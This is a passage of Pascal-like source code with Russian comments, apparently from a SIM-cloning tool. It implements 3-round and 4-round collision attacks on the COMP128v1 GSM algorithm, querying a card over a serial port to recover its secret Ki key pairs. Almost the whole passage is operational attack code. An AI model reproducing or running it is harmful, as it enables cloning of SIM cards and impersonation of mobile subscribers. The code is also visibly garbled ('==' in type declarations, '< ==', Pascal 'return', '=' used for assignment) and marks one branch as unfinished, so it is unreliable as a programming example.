	if AllFound<2 then begin
	 LWrite('->000',1);
	end; 
       end;
       if AllFound == 2 then begin
        {Нашли две коллизии}
        {Создаем списки возможных вариантов KI}
        LWrite('Calculating KI variation...',2);
	PrCalculating  =  false;
        AllKiFound  =  0;
	FoundPair1[0]  =  $0;
	FoundPair2[0]  =  $0;
	FoundPair1[1]  =  CollB[1];
	FoundPair2[1]  =  CollB[2];
        for CurCalcPair[0]  =  0 to $FF do begin
         for CurCalcPair[1]  =  0 to $FF do begin
          EmulKiRes1  =  Emu_3Rounds_v1(CPair,CurCalcPair,ResBuffer^[Cur_Uk].Data[0],FoundPair1);
          EmulKiRes2  =  Emu_3Rounds_v1(CPair,CurCalcPair,ResBuffer^[Cur_Uk].Data[1],FoundPair1);
          PrS  =  true;
          for I  =  0 to 7 do begin
           if EmulKiRes1[I]<>EmulKiRes2[I] then begin
            PrS  =  false;
            break;
           end;
          end;
          if PrS then begin
           EmulKiRes1  =  Emu_3Rounds_v1(CPair,CurCalcPair,ResBuffer^[Cur_Uk].Data[0],FoundPair2);
           EmulKiRes2  =  Emu_3Rounds_v1(CPair,CurCalcPair,ResBuffer^[Cur_Uk].Data[1],FoundPair2);
           PrS  =  true;
           for I  =  0 to 7 do begin
            if EmulKiRes1[I]<>EmulKiRes2[I] then begin
             PrS  =  false;
             break;
            end;
           end;
   	   if PrS then begin
            AllKiFound  =  AllKiFound+1;
	    KiVar[AllKiFound]  =  CurCalcPair;
	   end; 
	  end;    
         end;
        end;
	LWriteln(IntToStr(AllKiFound)+' found.',2);
	{Проверяем полученный список вариантов Ki}
	if AllKiFound>0 then begin
	 for I  =  1 to 16 do KiVarGood[I]  =  0;
	 PrCollGood  =  false;
	 for CurKiVar  =  1 to AllKiFound do begin
 	  LWrite('Checking KI pair '+PrintHexPair(KiVar[CurKiVar],false)+'...',2);
	  PrUncol  =  false;
	  for I  =  0 to 768 do begin
	   if (KiVar[CurKiVar,0] == UncolPair_2R_v1[I,0]) and (KiVar[CurKiVar,1] == UncolPair_2R_v1[I,1]) then begin
 	    PrUncol  =  true;
	    break;
	   end;
	   if (UncolPair_2R_v1[I,0]>KiVar[CurKiVar,0]) or 
	    ((UncolPair_2R_v1[I,0] == KiVar[CurKiVar,0]) and (UncolPair_2R_v1[I,1]>KiVar[CurKiVar,1])) then begin
 	    break; 
	   end; 
	  end;
	  if PrUncol == true then begin
	   KiVarGood[CurKiVar]  =  1;
	   LWriteln('Uncollision.',2);
	  end
	  else begin
	   {Ищем 2R-коллизию для данной пары KI}
	   FillChar(IndexCollBuffer^[0][0],4*256*256,$FF);
	   SC_Uk  =  0;
           for I  =  0 to $FF do begin 
	    R0_after_R1[I][0]  =  Comp128v1_T0[KiVar[CurKiVar][0]+2*I];
	    R0_after_R1[I][1]  =  Comp128v1_T0[2*KiVar[CurKiVar][0]+I];
	   end;    
           for I  =  0 to $FF do begin
	    R8_after_R1[I][0]  =  Comp128v1_T0[KiVar[CurKiVar][1]+2*I];
	    R8_after_R1[I][1]  =  Comp128v1_T0[2*KiVar[CurKiVar][1]+I];
	   end;    
           for CurPair[0]  =  0 to $FF do begin
            for CurPair[1]  =  0 to $FF do begin
	     PrS  =  false;
	     PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][0]+2*R8_after_R1[CurPair[1]][0]];
	     PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][0]+R8_after_R1[CurPair[1]][0]];
             Move(PairRes[0],EmulRes[0],2);
	     PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][1]+2*R8_after_R1[CurPair[1]][1]];
	     PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][1]+R8_after_R1[CurPair[1]][1]];
             Move(PairRes[0],EmulRes[2],2);
	     if IndexCollBuffer^[EmulRes[0]][EmulRes[1]] == -1 then begin
 	      CollBuffer^[SC_Uk].B2  =  EmulRes[2];
	      CollBuffer^[SC_Uk].B3  =  EmulRes[3];
	      CollBuffer^[SC_Uk].Pair  =  CurPair;
	      CollBuffer^[SC_Uk].Next  =  -1;
	      IndexCollBuffer^[EmulRes[0]][EmulRes[1]]  =  SC_Uk;
	      SC_Uk  =  SC_Uk+1;
	     end
	     else begin
	      NextColl  =  IndexCollBuffer^[EmulRes[0]][EmulRes[1]];
	      PrevColl  =  -1;
	      PrS  =  false;
              while NextColl<>-1 do begin
	       if (CollBuffer^[NextColl].B2 == EmulRes[2]) and (CollBuffer^[NextColl].B3 == EmulRes[3]) then begin
	        FoundPair1  =  CollBuffer^[NextColl].Pair;
	        FoundPair2  =  CurPair;
		PrS  =  true;
	        break;
	       end
	       else begin
                PrevColl  =  NextColl;
                NextColl  =  CollBuffer^[NextColl].Next;
	       end;
              end;
	      if NextColl == -1 then begin
	       CollBuffer^[SC_Uk].B2  =  EmulRes[2];
	       CollBuffer^[SC_Uk].B3  =  EmulRes[3];
               CollBuffer^[SC_Uk].Pair  =  CurPair;
               CollBuffer^[SC_Uk].Next  =  -1;
               CollBuffer^[PrevColl].Next  =  SC_Uk;
               SC_Uk  =  SC_Uk+1;
              end;
	     end;
	     if PrS then break;
	    end;
	    if PrS then break;
	   end;    
	   {Проверяем пару по найденной коллизии}
           FillChar(CRand1[0],16,$0);
           FillChar(CRand2[0],16,$0);
	   CRand1[Pair]  =  FoundPair1[0];
	   CRand1[Pair+8]  =  FoundPair1[1]; 
	   CRand2[Pair]  =  FoundPair2[0];
	   CRand2[Pair+8]  =  FoundPair2[1]; 
           while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,CSRes1)<>0) do ;
           if RetraceFile == '' then begin
            Result  =  Gsm(Port,CRand1,CSRes1);
           end
           else begin
            Result  =  0;
            if Compare2Rands(RetraceRand,CRand1) == false then begin
             LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
             LWriteln('Expected   ==  '+PrintHexData16(CRand1,true),2);
             LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
             LWriteln('',2);
             A3Rv1  =  -1;
             return;
            end;
           end; 
           if (Result<>0) then begin
            A3Rv1  =  -1;
            return;
           end;
           while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,CSRes2)<>0) do ;
           if RetraceFile == '' then begin
            Result  =  Gsm(Port,CRand2,CSRes2);
           end
           else begin
            Result  =  0;
            if Compare2Rands(RetraceRand,CRand2) == false then begin
             LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
             LWriteln('Expected   ==  '+PrintHexData16(CRand2,true),2);
             LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
             LWriteln('',2);
             A3Rv1  =  -1;
             return;
            end;
           end; 
           if (Result<>0) then begin
            A3Rv1  =  -1;
            return;
           end;
           PrS  =  true;
           for J  =  0 to 11 do begin
            if CSRes1[J]<>CSRes2[J] then begin
     	     PrS  =  false;
   	     break;
	    end;
           end;
	   if PrS then begin
	    KiVarGood[CurKiVar]  =  2;
	    PrCollGood  =  true;
	    LWriteln('OK.',2);
	   end
	   else begin
	    LWriteln('Wrong.',2);
	   end; 
	  end;
	 end; 
	 if PrCollGood then begin
	  for I  =  1 to 16 do begin
	   if KiVarGood[I] == 1 then KiVarGood[I]  =  0;
	  end;
	 end;
	 CurGoodKi  =  0;
	 for I  =  1 to 16 do begin
	  if KiVarGood[I]<>0 then begin
	   CurGoodKi  =  CurGoodKi+1;
	   GoodKi[CurGoodKi]  =  KiVar[I];
	  end;
	 end;
	 {Посмотрим, сколько пар KI мы нашли}
	 if CurGoodKi == 0 then begin
	  LWriteln('Cannot find good KI pair variants. Continue 3R-attack with other two pairs.',2);
	  PrCalculating  =  true;
	 end;
	 if CurGoodKi == 1 then begin
	  LWriteln('Found KI pair  ==  '+PrintHexPair(GoodKi[1],false),2);
	  KiPair  =  GoodKi[1];
	  PrCalculating  =  true;
	  Pr3RAttack  =  true;
	 end;
	 if CurGoodKi>1 then begin
          LWriteln(CharsetUpdate('НЕДОПИСАНО!!! НЕСКОЛЬКО УСПЕШНЫХ ВАРИАНТОВ!!!'),2);
          return;
         end;
        end
        else begin
	 LWriteln('Cannot find KI pair variants. Continue 3R-attack with other two pairs.',2);
	 PrCalculating  =  true;
	end; 
        if PrCalculating then break;
       end;
      end;
      if Pr3RAttack == true then break;
      if AllFound<2 then begin
       LWriteln(chr($0D),1);
       LWriteln('Cannot find two collisions. Continue 3R-attack with other two pairs.',2);
      end;
      if Stop3R == true then break;
     end; 
     if Pr3RAttack == true then break;
     Cur_Uk  =  Cur_Uk+1;
     if Cur_Uk>(Res_Uk-1) then begin
      if PrStep == false then begin
       PrStep  =  true;
       Cur_Uk  =  0;
      end;
     end;
    end;
   end;    
   {Выведем результаты}
   if Pr3RAttack == true then begin
    LWriteln('-------------------------------',2);
    LWriteln('3R-attack OK. KI pair  ==  '+PrintHexPair(KiPair,true)+'. Using '+IntToStr(AllGSMStep)+' GSM steps.',2);
    LWriteln('-------------------------------',2);
   end
   else begin
    LWriteln('-------------------------------',2);
    LWriteln('3R-attack FAILED! Using '+IntToStr(AllGSMStep)+' GSM steps.',2);
    LWriteln('-------------------------------',2);
    Res  =  1;
   end;
   FreeMem(DataBuffer,SizeOf(TA3Rv1_Data));
   FreeMem(IndexBuffer,SizeOf(TA3Rv1_Index));
   FreeMem(ResBuffer,SizeOf(TA3Rv1_Res));
   FreeMem(CollBuffer,SizeOf(TA3Rv1_Coll));
   FreeMem(IndexCollBuffer,SizeOf(TA3Rv1_CollIndex));
   LWriteln('',2);
   A3Rv1  =  Res;
  end;

 {Функция проведения 4R-атаки на алгоритм Comp128v1}  
 function A4Rv1(var Port:TBlockSerial;Pair:byte;CPair1,CPair2:TPair;var KIPair:TPair):Longint;
  type
   TSearchRec == record
    B0,B1,B2:byte;
    BD:byte;
   end;
   TSearch == array[0..3] of TSearchRec;
  var
   Res:Longint;
   DataBuffer:PA4Rv1_Data;
   IndexBuffer:PA4Rv1_Index;
   ResBuffer1,ResBuffer2:PA4Rv1_Res;
   ResBuffer8:PA4Rv1_Res8;
   CollBuffer:PA4Rv1_Coll;
   IndexCollBuffer:PA4Rv1_CollIndex;
   Search:TSearch;
   R0_after_R1,R8_after_R1:array[0..255] of TPair;
   PairRes:TPair;
   WorkData:array[0..1] of TPair;
   WorkRes:array[0..1] of TData4;
   Concat8:array[0..3] of TPair;
   CalcByte:byte;
   CurPair:TPair;
   EmulRes:TData4;
   CommonUk:byte;
   Common:byte;
   SD_Uk,Res_Uk,Res1_Uk,Res2_Uk,SC_Uk:Longint;
   FoundPair1,FoundPair2:TPair;
   Cur_Uk:Longint;
   I,J,K:Longint;
   PrS:boolean;
   PrStep:boolean;
   Prev,Next:Longint;
   PrevColl,NextColl:Longint;
   Pr4RAttack:boolean;
   P1,P2:Longint;
   PN:byte;
   AllFound:Longint;
   AKiPair,AKiPair1,AKiPair2:shortint;
   Rand1,Rand2:TData16;
   RandCheck1,RandCheck2:TData16;
   Uk:Longint;
   SRes1,SRes2:TData12;
   CollCounter:Longint;
   S:String[3];
   Result:Longint;
   CollB:array[0..31] of byte;
   AllKiFound:Longint;   
   KiVar:array[1..16] of TPair;
   LByte:byte;
   ResR1_0:TPair;
   ResR1_1:TPair;
   CaseByte:byte;
   ResR2:byte;
   CommonCheck:array[0..$3F] of byte;
   CurKiVar:Longint;
   CRand1,CRand2:TData16;
   RetraceRand:TData16;
   CSRes1,CSRes2:TData12;
   KiVarGood:array[1..16] of byte;
   PrCollGood:boolean;
   GoodKi:array[1..16] of TPair;
   CurGoodKi:Longint;
   PrUncol:boolean;
      
  begin
   Res  =  0;
   FillChar(KIPair[0],2,$0);
   LWriteln('-------------------------------',2);
   LWriteln('Starting 4R-attack on pair '+IntToStr(Pair)+'...',2);
   LWriteln('-------------------------------',2);
   DataBuffer  =  nil;
   GetMem(DataBuffer,SizeOf(TA4Rv1_Data));
   if DataBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for DataBuffer!',2);
    LWriteln('',2);
    A4Rv1  =  -1;
    return;
   end;
   IndexBuffer  =  nil;
   GetMem(IndexBuffer,SizeOf(TA4Rv1_Index));
   if IndexBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for IndexBuffer!',2);
    LWriteln('',2);
    A4Rv1  =  -1;
    return;
   end;
   CollBuffer  =  nil;
   GetMem(CollBuffer,SizeOf(TA4Rv1_Coll));
   if CollBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for CollBuffer!',2);
    LWriteln('',2);
    A4Rv1  =  -1;
    return;
   end;
   IndexCollBuffer  =  nil;
   GetMem(IndexCollBuffer,SizeOf(TA4Rv1_CollIndex));
   if IndexCollBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for IndexCollBuffer!',2);
    LWriteln('',2);
    A4Rv1  =  -1;
    return;
   end;
   ResBuffer1  =  nil;
   GetMem(ResBuffer1,SizeOf(TA4Rv1_Res));
   if ResBuffer1 == nil then begin
    LWriteln('ERROR! Cannot allocate memory for ResBuffer1!',2);
    LWriteln('',2);
    A4Rv1  =  -1;
    return;
   end;
   ResBuffer2  =  nil;
   GetMem(ResBuffer2,SizeOf(TA4Rv1_Res));
   if ResBuffer2 == nil then begin
    LWriteln('ERROR! Cannot allocate memory for ResBuffer2!',2);
    LWriteln('',2);
    A4Rv1  =  -1;
    return;
   end;
   ResBuffer8  =  nil;
   GetMem(ResBuffer8,SizeOf(TA4Rv1_Res8));
   if ResBuffer8 == nil then begin
    LWriteln('ERROR! Cannot allocate memory for ResBuffer8!',2);
    LWriteln('',2);
    A4Rv1  =  -1;
    return;
   end;
   {Исход атаки}
   Pr4RAttack  =  false;
   {Ищем четверки, которые после 2-х раундов отличаются одним байтом}
   LWriteln('Calculating data for 4R-attack...',2);
   {Первая пара}
   FillChar(IndexBuffer^[0][0],4*128*128,$FF);
   SD_Uk  =  0;
   Res1_Uk  =  0;
   for I  =  0 to $FF do begin
    R0_after_R1[I][0]  =  Comp128v1_T0[CPair1[0]+2*I];
    R0_after_R1[I][1]  =  Comp128v1_T0[2*CPair1[0]+I];
   end;    
   for I  =  0 to $FF do begin
    R8_after_R1[I][0]  =  Comp128v1_T0[CPair1[1]+2*I];
    R8_after_R1[I][1]  =  Comp128v1_T0[2*CPair1[1]+I];
   end;    
   for CurPair[0]  =  0 to $FF do begin
    for CurPair[1]  =  0 to $FF do begin
     PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][0]+2*R8_after_R1[CurPair[1]][0]];
     PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][0]+R8_after_R1[CurPair[1]][0]];
     Search[0].BD  =  PairRes[0];
     Search[1].B0  =  PairRes[0];
     Search[2].B0  =  PairRes[0];
     Search[3].B0  =  PairRes[0];
     Search[0].B0  =  PairRes[1];
     Search[1].BD  =  PairRes[1];
     Search[2].B1  =  PairRes[1];
     Search[3].B1  =  PairRes[1];
     PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][1]+2*R8_after_R1[CurPair[1]][1]];
     PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][1]+R8_after_R1[CurPair[1]][1]];
     Search[0].B1  =  PairRes[0];
     Search[1].B1  =  PairRes[0];
     Search[2].BD  =  PairRes[0];
     Search[3].B2  =  PairRes[0];
     Search[0].B2  =  PairRes[1];
     Search[1].B2  =  PairRes[1];
     Search[2].B2  =  PairRes[1];
     Search[3].BD  =  PairRes[1];
     for CalcByte  =  0 to 3 do begin
      if (IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1] == -1) then begin
       DataBuffer^[SD_Uk].B2  =  Search[CalcByte].B2;
       DataBuffer^[SD_Uk].Nomer  =  CalcByte;
       DataBuffer^[SD_Uk].BD  =  Search[CalcByte].BD;
       DataBuffer^[SD_Uk].Pair  =  CurPair;
       DataBuffer^[SD_Uk].Next  =  -1;
       IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1]  =  SD_Uk;
       SD_Uk  =  SD_Uk+1;
      end
      else begin
       Next  =  IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1];
       Prev  =  -1;
       while Next<>-1 do begin
	if (DataBuffer^[Next].B2 == Search[CalcByte].B2) and (DataBuffer^[Next].Nomer == CalcByte) and
	 (DataBuffer^[Next].BD<>Search[CalcByte].BD) then begin
	 WorkData[0]  =  DataBuffer^[Next].Pair;
	 WorkData[1]  =  CurPair;
	 case CalcByte of
	  0:begin
	   WorkRes[0][0]  =  DataBuffer^[Next].BD;
	   WorkRes[0][1]  =  Search[CalcByte].B0;
	   WorkRes[0][2]  =  Search[CalcByte].B1;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].BD;
	   WorkRes[1][1]  =  Search[CalcByte].B0;
	   WorkRes[1][2]  =  Search[CalcByte].B1;
	   WorkRes[1][3]  =  Search[CalcByte].B2;
	  end;
	  1:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  DataBuffer^[Next].BD;
	   WorkRes[0][2]  =  Search[CalcByte].B1;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].BD;
	   WorkRes[1][2]  =  Search[CalcByte].B1;
	   WorkRes[1][3]  =  Search[CalcByte].B2;
	  end;
	  2:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  Search[CalcByte].B1;
	   WorkRes[0][2]  =  DataBuffer^[Next].BD;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].B1;
	   WorkRes[1][2]  =  Search[CalcByte].BD;
	   WorkRes[1][3]  =  Search[CalcByte].B2;	   
	  end;
	  3:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  Search[CalcByte].B1;
	   WorkRes[0][2]  =  DataBuffer^[Next].B2;
	   WorkRes[0][3]  =  DataBuffer^[Next].BD;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].B1;
	   WorkRes[1][2]  =  Search[CalcByte].B2;
	   WorkRes[1][3]  =  Search[CalcByte].BD;
	  end;
	 end;
	 ResBuffer1^[Res1_Uk].Data  =  WorkData;
	 ResBuffer1^[Res1_Uk].Res  =  WorkRes;
	 ResBuffer1^[Res1_Uk].Nomer  =  CalcByte;
	 Res1_Uk  =  Res1_Uk+1;
	end;
	Prev  =  Next;
        Next  =  DataBuffer^[Next].Next;
       end;
       DataBuffer^[SD_Uk].B2  =  Search[CalcByte].B2;
       DataBuffer^[SD_Uk].Nomer  =  CalcByte;
       DataBuffer^[SD_Uk].BD  =  Search[CalcByte].BD;
       DataBuffer^[SD_Uk].Pair  =  CurPair;
       DataBuffer^[SD_Uk].Next  =  -1;
       DataBuffer^[Prev].Next  =  SD_Uk;
       SD_Uk  =  SD_Uk+1;
      end;
     end;
    end;      
   end;   
   LWriteln('Found '+IntToStr(Res1_Uk)+' possible 4-bytes pair groups (1).',2);
   {Вторая пара}
   FillChar(IndexBuffer^[0][0],4*128*128,$FF);
   SD_Uk  =  0;
   Res2_Uk  =  0;
   for I  =  0 to $FF do begin
    R0_after_R1[I][0]  =  Comp128v1_T0[CPair2[0]+2*I];
    R0_after_R1[I][1]  =  Comp128v1_T0[2*CPair2[0]+I];
   end;    
   for I  =  0 to $FF do begin
    R8_after_R1[I][0]  =  Comp128v1_T0[CPair2[1]+2*I];
    R8_after_R1[I][1]  =  Comp128v1_T0[2*CPair2[1]+I];
   end;    
   for CurPair[0]  =  0 to $FF do begin
    for CurPair[1]  =  0 to $FF do begin
     PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][0]+2*R8_after_R1[CurPair[1]][0]];
     PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][0]+R8_after_R1[CurPair[1]][0]];
     Search[0].BD  =  PairRes[0];
     Search[1].B0  =  PairRes[0];
     Search[2].B0  =  PairRes[0];
     Search[3].B0  =  PairRes[0];
     Search[0].B0  =  PairRes[1];
     Search[1].BD  =  PairRes[1];
     Search[2].B1  =  PairRes[1];
     Search[3].B1  =  PairRes[1];
     PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][1]+2*R8_after_R1[CurPair[1]][1]];
     PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][1]+R8_after_R1[CurPair[1]][1]];
     Search[0].B1  =  PairRes[0];
     Search[1].B1  =  PairRes[0];
     Search[2].BD  =  PairRes[0];
     Search[3].B2  =  PairRes[0];
     Search[0].B2  =  PairRes[1];
     Search[1].B2  =  PairRes[1];
     Search[2].B2  =  PairRes[1];
     Search[3].BD  =  PairRes[1];
     for CalcByte  =  0 to 3 do begin
      if (IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1] == -1) then begin
       DataBuffer^[SD_Uk].B2  =  Search[CalcByte].B2;
       DataBuffer^[SD_Uk].Nomer  =  CalcByte;
       DataBuffer^[SD_Uk].BD  =  Search[CalcByte].BD;
       DataBuffer^[SD_Uk].Pair  =  CurPair;
       DataBuffer^[SD_Uk].Next  =  -1;
       IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1]  =  SD_Uk;
       SD_Uk  =  SD_Uk+1;
      end
      else begin
       Next  =  IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1];
       Prev  =  -1;
       while Next<>-1 do begin
	if (DataBuffer^[Next].B2 == Search[CalcByte].B2) and (DataBuffer^[Next].Nomer == CalcByte) and
	 (DataBuffer^[Next].BD<>Search[CalcByte].BD) then begin
	 WorkData[0]  =  DataBuffer^[Next].Pair;
	 WorkData[1]  =  CurPair;
	 case CalcByte of
	  0:begin
	   WorkRes[0][0]  =  DataBuffer^[Next].BD;
	   WorkRes[0][1]  =  Search[CalcByte].B0;
	   WorkRes[0][2]  =  Search[CalcByte].B1;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].BD;
	   WorkRes[1][1]  =  Search[CalcByte].B0;
	   WorkRes[1][2]  =  Search[CalcByte].B1;
	   WorkRes[1][3]  =  Search[CalcByte].B2;
	  end;
	  1:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  DataBuffer^[Next].BD;
	   WorkRes[0][2]  =  Search[CalcByte].B1;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].BD;
	   WorkRes[1][2]  =  Search[CalcByte].B1;
	   WorkRes[1][3]  =  Search[CalcByte].B2;
	  end;
	  2:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  Search[CalcByte].B1;
	   WorkRes[0][2]  =  DataBuffer^[Next].BD;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].B1;
	   WorkRes[1][2]  =  Search[CalcByte].BD;
	   WorkRes[1][3]  =  Search[CalcByte].B2;	   
	  end;
	  3:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  Search[CalcByte].B1;
	   WorkRes[0][2]  =  DataBuffer^[Next].B2;
	   WorkRes[0][3]  =  DataBuffer^[Next].BD;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].B1;
	   WorkRes[1][2]  =  Search[CalcByte].B2;
	   WorkRes[1][3]  =  Search[CalcByte].BD;
	  end;
	 end;
	 ResBuffer2^[Res2_Uk].Data  =  WorkData;
	 ResBuffer2^[Res2_Uk].Res  =  WorkRes;
	 ResBuffer2^[Res2_Uk].Nomer  =  CalcByte;
	 Res2_Uk  =  Res2_Uk+1;
	end;
	Prev  =  Next;
        Next  =  DataBuffer^[Next].Next;
       end;
       DataBuffer^[SD_Uk].B2  =  Search[CalcByte].B2;
       DataBuffer^[SD_Uk].Nomer  =  CalcByte;
       DataBuffer^[SD_Uk].BD  =  Search[CalcByte].BD;
       DataBuffer^[SD_Uk].Pair  =  CurPair;
       DataBuffer^[SD_Uk].Next  =  -1;
       DataBuffer^[Prev].Next  =  SD_Uk;
       SD_Uk  =  SD_Uk+1;
      end;
     end;
    end;      
   end;   
   LWriteln('Found '+IntToStr(Res2_Uk)+' possible 4-bytes pair groups (2).',2);
   {Ищем восьмерки, которые после 3-х раундов отличаются 1 байтом}
   Res_Uk  =  0;
   for P1  =  0 to (Res1_Uk-1) do begin
    for P2  =  0 to (Res2_Uk-1) do begin
     if (ResBuffer1^[P1].Nomer == ResBuffer2^[P2].Nomer) then begin
      PN  =  ResBuffer1^[P1].Nomer;
      Concat8[0]  =  Emu_3R_v1(ResBuffer1^[P1].Res[0][PN],ResBuffer2^[P2].Res[0][PN]);
      Concat8[1]  =  Emu_3R_v1(ResBuffer1^[P1].Res[0][PN],ResBuffer2^[P2].Res[1][PN]);         
      Concat8[2]  =  Emu_3R_v1(ResBuffer1^[P1].Res[1][PN],ResBuffer2^[P2].Res[0][PN]);
      Concat8[3]  =  Emu_3R_v1(ResBuffer1^[P1].Res[1][PN],ResBuffer2^[P2].Res[1][PN]);
      for I  =  0 to 2 do begin
       for J  =  (I+1) to 3 do begin
        if (Concat8[I][0] == Concat8[J][0]) and (Concat8[I][1]<>Concat8[J][1]) then begin
	 {Проверим может ли данная 8-ка дать 8 common-байтов}
	 AllFound  =  0;
	 for K  =  0 to 13 do begin
          if ((RandPair_4R_v1_Common[K].Pair[0] == Concat8[I][1]) and 
           (RandPair_4R_v1_Common[K].Pair[1] == Concat8[J][1])) or
           ((RandPair_4R_v1_Common[K].Pair[0] == Concat8[J][1]) and 
           (RandPair_4R_v1_Common[K].Pair[1] == Concat8[I][1])) then begin
           AllFound  =  1;
	   CommonUk  =  K;
           break;
          end;
         end;
         if AllFound == 1 then begin
	  ResBuffer8^[Res_Uk].Data[0][0]  =  ResBuffer1^[P1].Data[((I and $02) shr 1)];
	  ResBuffer8^[Res_Uk].Data[0][1]  =  ResBuffer2^[P2].Data[(I and $01)];
	  ResBuffer8^[Res_Uk].Data[1][0]  =  ResBuffer1^[P1].Data[((J and $02) shr 1)];
	  ResBuffer8^[Res_Uk].Data[1][1]  =  ResBuffer2^[P2].Data[(J and $01)];
	  ResBuffer8^[Res_Uk].Res[0]  =  Emu_3Rounds_v1(CPair1,CPair2,
	   ResBuffer8^[Res_Uk].Data[0][0],ResBuffer8^[Res_Uk].Data[0][1]);
	  ResBuffer8^[Res_Uk].Res[1]  =  Emu_3Rounds_v1(CPair1,CPair2,
	   ResBuffer8^[Res_Uk].Data[1][0],ResBuffer8^[Res_Uk].Data[1][1]);
	  ResBuffer8^[Res_Uk].Nomer  =  PN; 
          ResBuffer8^[Res_Uk].CommonUk  =  CommonUk; 
	  Res_Uk  =  Res_Uk+1;
	 end;
	end; 
       end;
      end; 
     end;
    end;
   end;     
   LWriteln('Found '+IntToStr(Res_Uk)+' collision possible 8-bytes pair groups.',2);
   {Проверяем найденные группы - ищем коллизии}
   PrStep  =  false;
   Cur_Uk  =  0;
   while Cur_Uk< == (Res_Uk-1) do begin
    if ((PrStep == false) and (ResBuffer8^[Cur_Uk].CommonUk< == 7)) or
     ((PrStep == true) and (ResBuffer8^[Cur_Uk].CommonUk> == 8)) then begin
     LWriteln('Using two data groups:',2);
     LWriteln(' 1-st group: '+PrintHexPair(ResBuffer8^[Cur_Uk].Data[0][0],false)+' '+
      PrintHexPair(ResBuffer8^[Cur_Uk].Data[0][1],false)+
      ', 3R-result: '+PrintHexData8(ResBuffer8^[Cur_Uk].Res[0],false),2);
     LWriteln(' 2-nd group: '+PrintHexPair(ResBuffer8^[Cur_Uk].Data[1][0],false)+' '+
      PrintHexPair(ResBuffer8^[Cur_Uk].Data[1][1],false)+
      ', 3R-result: '+PrintHexData8(ResBuffer8^[Cur_Uk].Res[1],false),2);
     LWrite('Common bytes == ',2);
     for I  =  0 to 7 do begin
      LWrite(PrintHexByte(RandPair_4R_v1_Common[ResBuffer8^[Cur_Uk].CommonUk].Commons[I]),2);
      if I<>7 then begin
       LWrite(',',2);
      end; 
     end;
     LWriteln('',2);
     {Заполним массив CommonCheck}
     FillChar(CommonCheck[0],64,0);
     for I  =  0 to 7 do CommonCheck[RandPair_4R_v1_Common[ResBuffer8^[Cur_Uk].CommonUk].Commons[I]]  =  1;
     {Ищем восемь коллизий}
     AllFound  =  0;
     FillChar(Rand1[0],16,$0);
     FillChar(Rand2[0],16,$0);
     FillChar(RandCheck1[0],16,$11);
     FillChar(RandCheck2[0],16,$11);
     AKiPair  =  Pair+4;
     if AKiPair>7 then AKiPair  =  AKiPair-8;    
     AKiPair1  =  Pair-2;
     if AKiPair1<0 then AKiPair1  =  AKiPair1+8;
     AKiPair2  =  Pair+2;
     if AKiPair2>7 then AKiPair2  =  AKiPair2-8;
     Rand1[AKiPair1]  =  ResBuffer8^[Cur_Uk].Data[0][0][0];
     RandCheck1[AKiPair1]  =  ResBuffer8^[Cur_Uk].Data[0][0][0];
     Rand1[AKiPair1+8]  =  ResBuffer8^[Cur_Uk].Data[0][0][1];
     RandCheck1[AKiPair1+8]  =  ResBuffer8^[Cur_Uk].Data[0][0][1];
     Rand1[AKiPair2]  =  ResBuffer8^[Cur_Uk].Data[0][1][0];
